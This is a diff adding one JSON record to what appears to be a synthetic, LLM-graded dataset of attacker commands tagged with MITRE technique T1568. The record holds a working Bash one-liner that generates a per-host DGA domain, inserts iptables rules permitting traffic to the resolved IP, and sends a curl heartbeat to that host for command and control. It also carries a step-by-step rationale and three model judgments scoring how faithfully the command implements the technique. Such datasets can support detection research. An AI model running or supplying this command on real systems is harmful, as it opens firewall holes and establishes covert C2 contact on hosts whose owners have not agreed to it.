@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'hostid=$(hostname | sha1sum | cut -c1-6); d=\"$hostid.$(date -u +%Y%m%d).cloud-edge.biz\"; ip=$(dig +short A \"$d\" | shuf -n1); if [ -n \"$ip\" ]; then port=$(shuf -i 40000-65500 -n1); iptables -I OUTPUT -p tcp -d \"$ip\" --dport \"$port\" -j ACCEPT; iptables -I INPUT -p tcp -s \"$ip\" --sport \"$port\" -j ACCEPT; curl -fsS --connect-timeout 4 --max-time 8 \"http://$d:$port/beat?hid=$hostid\"; fi'",
+  "explanation": "Derives a per-host DGA subdomain, resolves it to an IP, permits that IP on a randomized high port via iptables, and sends a brief heartbeat to establish C2 reachability.",
+  "rationale_steps": [
+    "Generate host-unique DGA subdomain tied to current date",
+    "Resolve to obtain the current C2 IP",
+    "Open iptables for the resolved IP and random high port",
+    "Send a short-lived heartbeat with curl to avoid long sessions"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-25462b7d",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct syntax for all the tools used (bash, hostname, sha1sum, dig, shuf, iptables, curl).",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1568 Dynamic Resolution technique by algorithmically generating a domain based on hostname and date, resolving it to an IP, establishing firewall rules for communication, and sending a heartbeat to establish command and control.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:44:08.656269Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid command substitutions, proper separators, and correct flag formats for all utilities used.",
+        "semantic_score": 3,
+        "semantic_justification": "The command semantically aligns with DGA and beaconing for T1568, but the critical 'iptables' commands to permit traffic will fail due to the stated 'Privilege: None', preventing the full establishment of C2 reachability as claimed.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T07:44:23.231373Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with balanced quotes, valid flags, correct separators, and properly structured if/fi and command substitutions.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements DGA-style domain generation, DNS resolution, randomized port selection, and a beacon consistent with T1568, but the iptables steps would typically fail without root privileges so full intent may not be realized.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:44:54.828493Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
